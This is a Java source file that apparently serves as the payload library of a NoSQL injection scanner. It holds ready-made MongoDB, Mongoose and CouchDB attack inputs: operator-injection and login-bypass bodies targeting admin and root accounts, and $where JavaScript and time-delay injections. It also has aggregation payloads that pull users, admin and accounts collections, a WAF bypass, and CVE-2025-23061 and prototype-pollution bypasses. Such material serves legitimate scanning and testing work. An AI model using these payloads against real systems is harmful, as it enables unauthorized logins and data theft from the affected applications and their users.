package nosqli;

import java.util.*;

/**
 * Comprehensive NoSQL Injection Payload Database
 *
 * Categories:
 *  1. OPERATOR_INJECTION    - MongoDB comparison/logical operators
 *  2. AUTH_BYPASS           - Authentication bypass payloads
 *  3. JS_INJECTION          - JavaScript via $where operator
 *  4. TIME_BASED            - Time-based blind detection (sleep/DoS-safe)
 *  5. ERROR_BASED           - Syntax errors to detect injection points
 *  6. BLIND_BOOLEAN         - True/false condition pairs for blind detection
 *  7. AGGREGATION           - Aggregation pipeline injection (MongoDB 2024+)
 *  8. COUCHDB               - CouchDB-specific payloads
 */
public class PayloadDatabase {

    // ─────────────────────────────────────────────────────────────
    // BODY TYPE CONSTANTS
    // ─────────────────────────────────────────────────────────────
    public static final int BODY_URLENCODED = 0;
    public static final int BODY_JSON       = 1;
    public static final int BODY_MULTIPART  = 2;
    public static final int BODY_RAW        = 3;
    public static final int BODY_GET_PARAM  = 4;

    // ─────────────────────────────────────────────────────────────
    // PAYLOAD TYPES
    // ─────────────────────────────────────────────────────────────

    /**
     * Error-based syntax payloads - inject to detect parsing errors.
     * These cause MongoDB to throw syntax or type errors.
     * Strings are raw values to REPLACE/APPEND to param value.
     */
    public static final String[] ERROR_DETECTION_CHARS = {
        "'",
        "\"",
        "\\",
        ";",
        "{",
        "}",
        "$",
        "\\u0000",
        "\0",
        "null",
        "undefined"
    };

    /**
     * MongoDB error signatures to look for in responses.
     * Case-insensitive.
     */
    public static final String[] MONGODB_ERROR_SIGNATURES = {
        "MongoError",
        "mongo",
        "MongoDB",
        "BSONTypeError",
        "BufioReader",
        "document failed validation",
        "invalid operator",
        "unknown operator",
        "BadValue",
        "Overflow",
        "failed to parse",
        "$where is not allowed",
        "SyntaxError",
        "ReferenceError",
        "CastError",
        "Cast to",
        "ObjectId failed",
        "json: cannot unmarshal",
        "unexpected token",
        "ScanObjectIdError",
        "MongooseError",
        "ValidationError",
        "OperationFailure"
    };

    /**
     * CouchDB error signatures
     */
    public static final String[] COUCHDB_ERROR_SIGNATURES = {
        "CouchDB",
        "couchdb",
        "Futon",
        "bad_request",
        "illegal_docid",
        "invalid_json"
    };

    // ─────────────────────────────────────────────────────────────
    // OPERATOR INJECTION PAYLOADS
    // Format: [true_payload, false_payload, description]
    // true_payload  → should return MORE data (true condition)
    // false_payload → should return LESS/NO data (false condition)
    // ─────────────────────────────────────────────────────────────

    public static class BooleanPair {
        public final String truePayload;
        public final String falsePayload;
        public final String description;
        public final int bodyType;

        public BooleanPair(String truePayload, String falsePayload, String description, int bodyType) {
            this.truePayload = truePayload;
            this.falsePayload = falsePayload;
            this.description = description;
            this.bodyType = bodyType;
        }
    }

    /**
     * URL-encoded operator injection boolean pairs.
     * Used when Content-Type is application/x-www-form-urlencoded or GET params.
     */
    public static List<BooleanPair> getUrlEncodedBooleanPairs(String paramName) {
        List<BooleanPair> pairs = new ArrayList<>();

        // $ne operator (not equal) - classic auth bypass
        pairs.add(new BooleanPair(
            paramName + "[$ne]=nosqlhunter_impossible_value_xyz",
            paramName + "=nosqlhunter_impossible_value_xyz",
            "Operator $ne (not equal) injection",
            BODY_URLENCODED
        ));

        // $gt operator (greater than)
        pairs.add(new BooleanPair(
            paramName + "[$gt]=",
            paramName + "[$lt]=",
            "Operator $gt/$lt injection",
            BODY_URLENCODED
        ));

        // $regex - matches everything vs nothing
        pairs.add(new BooleanPair(
            paramName + "[$regex]=.*",
            paramName + "[$regex]=^impossible_xyz_no_match_12345$",
            "Operator $regex injection",
            BODY_URLENCODED
        ));

        // $exists true vs false
        pairs.add(new BooleanPair(
            paramName + "[$exists]=true",
            paramName + "[$exists]=false",
            "Operator $exists injection",
            BODY_URLENCODED
        ));

        // $nin - not in array
        pairs.add(new BooleanPair(
            paramName + "[$nin][]=impossible_xyz_12345",
            paramName + "[$in][]=impossible_xyz_12345",
            "Operator $nin/$in injection",
            BODY_URLENCODED
        ));

        // $gte injection
        pairs.add(new BooleanPair(
            paramName + "[$gte]=",
            paramName + "[$lte]=~~~~~impossible~~~~",
            "Operator $gte/$lte injection",
            BODY_URLENCODED
        ));

        return pairs;
    }

    /**
     * JSON body operator injection boolean pairs.
     * Used when Content-Type is application/json.
     * Returns modified JSON value strings (to replace the parameter value in JSON).
     */
    public static List<BooleanPair> getJsonBooleanPairs() {
        List<BooleanPair> pairs = new ArrayList<>();

        pairs.add(new BooleanPair(
            "{\"$ne\": \"nosqlhunter_impossible_xyz\"}",
            "\"nosqlhunter_impossible_xyz\"",
            "JSON $ne operator injection",
            BODY_JSON
        ));

        pairs.add(new BooleanPair(
            "{\"$gt\": \"\"}",
            "{\"$lt\": \"\"}",
            "JSON $gt/$lt operator injection",
            BODY_JSON
        ));

        pairs.add(new BooleanPair(
            "{\"$regex\": \".*\"}",
            "{\"$regex\": \"^impossible_xyz_no_match_12345$\"}",
            "JSON $regex operator injection",
            BODY_JSON
        ));

        pairs.add(new BooleanPair(
            "{\"$exists\": true}",
            "{\"$exists\": false}",
            "JSON $exists operator injection",
            BODY_JSON
        ));

        pairs.add(new BooleanPair(
            "{\"$nin\": [\"impossible_xyz_12345\"]}",
            "{\"$in\": [\"impossible_xyz_12345\"]}",
            "JSON $nin/$in operator injection",
            BODY_JSON
        ));

        pairs.add(new BooleanPair(
            "{\"$gte\": \"\"}",
            "{\"$lte\": \"~~~~~\"}",
            "JSON $gte/$lte operator injection",
            BODY_JSON
        ));

        // null bypass
        pairs.add(new BooleanPair(
            "{\"$ne\": null}",
            "null",
            "JSON $ne null injection",
            BODY_JSON
        ));

        // $type operator
        pairs.add(new BooleanPair(
            "{\"$type\": 2}",
            "{\"$type\": 99}",
            "JSON $type operator injection",
            BODY_JSON
        ));

        return pairs;
    }

    // ─────────────────────────────────────────────────────────────
    // AUTH BYPASS PAYLOADS (full request body replacements)
    // ─────────────────────────────────────────────────────────────

    /**
     * Auth bypass for URL-encoded login forms.
     * Returns list of full body strings to try.
     */
    public static List<String> getAuthBypassUrlEncoded(String userField, String passField) {
        List<String> payloads = new ArrayList<>();

        payloads.add(userField + "[$ne]=nosqli_xyz&" + passField + "[$ne]=nosqli_xyz");
        payloads.add(userField + "[$gt]=&" + passField + "[$gt]=");
        payloads.add(userField + "[$gte]=&" + passField + "[$gte]=");
        payloads.add(userField + "[$regex]=.*&" + passField + "[$regex]=.*");
        payloads.add(userField + "[$nin][]=xyz_impossible&" + passField + "[$nin][]=xyz_impossible");
        payloads.add(userField + "[$gt]=admin&" + userField + "[$lt]=test&" + passField + "[$ne]=nosqli");
        payloads.add(userField + "[$in][]=admin&" + userField + "[$in][]=user&" + userField + "[$in][]=administrator&" + passField + "[$gt]=");
        payloads.add(userField + "[$exists]=true&" + passField + "[$exists]=true");
        payloads.add(userField + "=admin&" + passField + "[$ne]=nosqli_impossible_xyz");
        payloads.add(userField + "=administrator&" + passField + "[$ne]=nosqli_impossible_xyz");
        payloads.add(userField + "=root&" + passField + "[$ne]=nosqli_impossible_xyz");

        return payloads;
    }

    /**
     * Auth bypass for JSON login forms.
     */
    public static List<String> getAuthBypassJson(String userField, String passField) {
        List<String> payloads = new ArrayList<>();

        payloads.add("{\"" + userField + "\": {\"$ne\": null}, \"" + passField + "\": {\"$ne\": null}}");
        payloads.add("{\"" + userField + "\": {\"$ne\": \"nosqli_xyz\"}, \"" + passField + "\": {\"$ne\": \"nosqli_xyz\"}}");
        payloads.add("{\"" + userField + "\": {\"$gt\": \"\"}, \"" + passField + "\": {\"$gt\": \"\"}}");
        payloads.add("{\"" + userField + "\": {\"$gte\": \"\"}, \"" + passField + "\": {\"$gte\": \"\"}}");
        payloads.add("{\"" + userField + "\": {\"$regex\": \".*\"}, \"" + passField + "\": {\"$regex\": \".*\"}}");
        payloads.add("{\"" + userField + "\": {\"$exists\": true}, \"" + passField + "\": {\"$exists\": true}}");
        payloads.add("{\"" + userField + "\": {\"$nin\": [\"nosqli_impossible_xyz\"]}, \"" + passField + "\": {\"$nin\": [\"nosqli_impossible_xyz\"]}}");
        payloads.add("{\"" + userField + "\": {\"$gt\": undefined}, \"" + passField + "\": {\"$gt\": undefined}}");
        payloads.add("{\"" + userField + "\": {\"$in\": [\"admin\", \"administrator\", \"root\", \"Admin\"]}, \"" + passField + "\": {\"$gt\": \"\"}}");
        payloads.add("{\"" + userField + "\": \"admin\", \"" + passField + "\": {\"$ne\": \"nosqli_impossible_xyz\"}}");
        // Duplicate key WAF bypass (MongoDB uses last key)
        payloads.add("{\"" + userField + "\": \"legitimate\", \"" + passField + "\": \"legitimate\", \"" + passField + "\": {\"$ne\": null}}");

        return payloads;
    }

    // ─────────────────────────────────────────────────────────────
    // JAVASCRIPT INJECTION PAYLOADS ($where operator)
    // ─────────────────────────────────────────────────────────────

    /**
     * JS injection payloads for $where and similar contexts.
     * Format: [true_payload, false_payload]
     */
    public static class JsPair {
        public final String truePayload;
        public final String falsePayload;
        public final String description;

        public JsPair(String t, String f, String d) {
            this.truePayload = t;
            this.falsePayload = f;
            this.description = d;
        }
    }

    public static List<JsPair> getJsInjectionPairs() {
        List<JsPair> pairs = new ArrayList<>();

        // Boolean true/false via JS
        pairs.add(new JsPair(
            "' || '1'=='1",
            "' || '1'=='2",
            "JS string concat true/false"
        ));
        pairs.add(new JsPair(
            "'; return true; var x='",
            "'; return false; var x='",
            "JS return true/false"
        ));
        pairs.add(new JsPair(
            "' && this.x.match(/.*/)",
            "' && this.x.match(/^IMPOSSIBLE_NOSQLI_HUNTER$/)",
            "JS regex match true/false"
        ));
        pairs.add(new JsPair(
            "0; return true",
            "0; return false",
            "JS numeric context return"
        ));
        pairs.add(new JsPair(
            "1==1",
            "1==2",
            "JS numeric equality"
        ));
        // URL-encoded variants
        pairs.add(new JsPair(
            "%27%20%7C%7C%20%271%27%3D%3D%271",
            "%27%20%7C%7C%20%271%27%3D%3D%272",
            "URL-encoded JS OR"
        ));

        return pairs;
    }

    // ─────────────────────────────────────────────────────────────
    // TIME-BASED PAYLOADS (SAFE - short delay, not DoS)
    // ─────────────────────────────────────────────────────────────

    /**
     * Time-based blind payloads.
     * We use a 3-second sleep to distinguish from normal latency.
     * These are safe - not the 10-second CPU burn version.
     */
    public static class TimedPayload {
        public final String payload;      // Injected value
        public final long expectedDelay;  // Expected ms delay
        public final String description;
        public final int bodyType;

        public TimedPayload(String p, long d, String desc, int bt) {
            this.payload = p;
            this.expectedDelay = d;
            this.description = desc;
            this.bodyType = bt;
        }
    }

    public static List<TimedPayload> getTimeBasedPayloads() {
        List<TimedPayload> payloads = new ArrayList<>();

        // MongoDB $where sleep via JS (3 second delay - identifiable, not abusive)
        payloads.add(new TimedPayload(
            "';var d=new Date();var t=d.getTime();var i=0;while(new Date().getTime()<t+3000){i++;}var nosqlih='x",
            3000,
            "MongoDB JS while-loop time delay (3s)",
            BODY_URLENCODED
        ));

        // Short form
        payloads.add(new TimedPayload(
            "0;var t=new Date();do{}while(new Date()-t<3000);",
            3000,
            "MongoDB JS do-while time delay (3s)",
            BODY_URLENCODED
        ));

        // JSON variant for $where
        payloads.add(new TimedPayload(
            "function(){var d=new Date();var t=d.getTime();while(new Date().getTime()<t+3000){}return true;}",
            3000,
            "MongoDB $where function time delay (3s)",
            BODY_JSON
        ));

        // URL-encoded JS time
        payloads.add(new TimedPayload(
            "%27%3Bvar%20t%3Dnew%20Date()%3Bdo%7B%7Dwhile(new%20Date()-t%3C3000)%3Bvar%20x%3D%27",
            3000,
            "MongoDB URL-encoded JS time delay (3s)",
            BODY_URLENCODED
        ));

        return payloads;
    }

    // ─────────────────────────────────────────────────────────────
    // AGGREGATION PIPELINE INJECTION (MongoDB 5.0+, 2024)
    // ─────────────────────────────────────────────────────────────

    public static final String[] AGGREGATION_OPERATORS = {
        "$lookup",
        "$unionWith",
        "$match",
        "$group",
        "$project",
        "$limit",
        "$skip",
        "$sort",
        "$unwind",
        "$out",
        "$merge",
        "$facet",
        "$bucket",
        "$graphLookup"
    };

    public static List<String> getAggregationPayloads() {
        List<String> payloads = new ArrayList<>();

        // Inject $lookup to access other collections
        payloads.add("{\"$lookup\": {\"from\": \"users\", \"localField\": \"_id\", \"foreignField\": \"_id\", \"as\": \"leaked\"}}");
        payloads.add("{\"$lookup\": {\"from\": \"admin\", \"localField\": \"_id\", \"foreignField\": \"_id\", \"as\": \"leaked\"}}");
        payloads.add("{\"$lookup\": {\"from\": \"accounts\", \"localField\": \"_id\", \"foreignField\": \"_id\", \"as\": \"leaked\"}}");

        // $unionWith to merge collection data
        payloads.add("{\"$unionWith\": {\"coll\": \"users\", \"pipeline\": []}}");
        payloads.add("{\"$unionWith\": \"users\"}");
        payloads.add("{\"$unionWith\": \"admin\"}");

        // $out to write to another collection
        payloads.add("{\"$out\": \"nosqli_hunter_test_output\"}");

        return payloads;
    }

    // ─────────────────────────────────────────────────────────────
    // CONTENT-TYPE CONFUSION / UPGRADE PAYLOADS
    // ─────────────────────────────────────────────────────────────

    /**
     * Returns payloads formatted as JSON for when we upgrade
     * Content-Type from urlencoded to application/json.
     */
    public static List<String> getContentTypeConfusionPayloads(String paramName) {
        List<String> payloads = new ArrayList<>();

        payloads.add("{\"" + paramName + "\": {\"$ne\": null}}");
        payloads.add("{\"" + paramName + "\": {\"$gt\": \"\"}}");
        payloads.add("{\"" + paramName + "\": {\"$regex\": \".*\"}}");
        payloads.add("{\"" + paramName + "\": {\"$exists\": true}}");

        return payloads;
    }

    // ─────────────────────────────────────────────────────────────
    // COUCHDB SPECIFIC PAYLOADS
    // ─────────────────────────────────────────────────────────────

    public static final String[] COUCHDB_PAYLOADS = {
        // View manipulation
        "?startkey=\"\"&endkey=\"\\ufff0\"",
        // Mango query injection
        "{\"selector\": {\"_id\": {\"$gt\": null}}}",
        "{\"selector\": {\"_id\": {\"$ne\": null}}}",
        // All-docs access
        "/_all_docs",
        "/_all_dbs",
        "/_session",
        // Boolean via Mango
        "{\"selector\": {\"$or\": [{\"_id\": {\"$gt\": null}}]}}",
        "{\"selector\": {\"$and\": [{\"_id\": {\"$ne\": null}}]}}",
    };

    // ─────────────────────────────────────────────────────────────
    // NOSQL OPERATOR WORDLIST (for fuzzing parameter names)
    // ─────────────────────────────────────────────────────────────

    public static final String[] NOSQL_OPERATORS = {
        "$where", "$ne", "$gt", "$lt", "$gte", "$lte",
        "$in", "$nin", "$regex", "$exists", "$type",
        "$or", "$and", "$not", "$nor", "$all", "$size",
        "$elemMatch", "$slice", "$mod", "$text", "$search",
        "$lookup", "$unionWith", "$match", "$group",
        "$project", "$limit", "$skip", "$sort", "$unwind",
        "$out", "$merge", "$expr", "$jsonSchema",
        "$geoNear", "$geoWithin", "$near", "$nearSphere"
    };

    // ─────────────────────────────────────────────────────────────
    // MONGOOSE-SPECIFIC CVE PAYLOADS (CVE-2025-23061, etc.)
    // ─────────────────────────────────────────────────────────────

    public static List<String> getMongooseBypassPayloads() {
        List<String> payloads = new ArrayList<>();

        // CVE-2025-23061: $where nested under $or bypasses Mongoose sanitizeFilter
        payloads.add("{\"$or\": [{\"$where\": \"1==1\"}]}");
        payloads.add("{\"$or\": [{\"$where\": \"this.password.length > 0\"}]}");

        // populate() match injection
        payloads.add("{\"$where\": \"global.process.mainModule.require\"}");

        // Prototype pollution vector
        payloads.add("{\"__proto__\": {\"$where\": \"1==1\"}}");
        payloads.add("{\"constructor\": {\"prototype\": {\"$where\": \"1==1\"}}}");

        return payloads;
    }

    // ─────────────────────────────────────────────────────────────
    // AUTHENTICATION SUCCESS INDICATORS
    // ─────────────────────────────────────────────────────────────

    public static final String[] AUTH_SUCCESS_KEYWORDS = {
        "dashboard", "welcome", "logout", "profile", "account",
        "success", "authenticated", "logged in", "session",
        "token", "jwt", "bearer", "authorization"
    };

    public static final String[] AUTH_FAILURE_KEYWORDS = {
        "invalid", "incorrect", "wrong", "failed", "error",
        "unauthorized", "denied", "bad credentials", "try again"
    };

    // ─────────────────────────────────────────────────────────────
    // HELPER: Detect if response indicates more data returned
    // (used for blind detection)
    // ─────────────────────────────────────────────────────────────

    public static boolean responseSizeIncreased(int baselineLen, int injectedLen) {
        // More than 10% increase in response size = possible data leak
        return injectedLen > (baselineLen * 1.10);
    }

    public static boolean responseSignificantlyDifferent(int baselineLen, int injectedLen) {
        double diff = Math.abs(injectedLen - baselineLen);
        double pct = diff / Math.max(baselineLen, 1);
        return pct > 0.15; // 15% difference threshold
    }
}
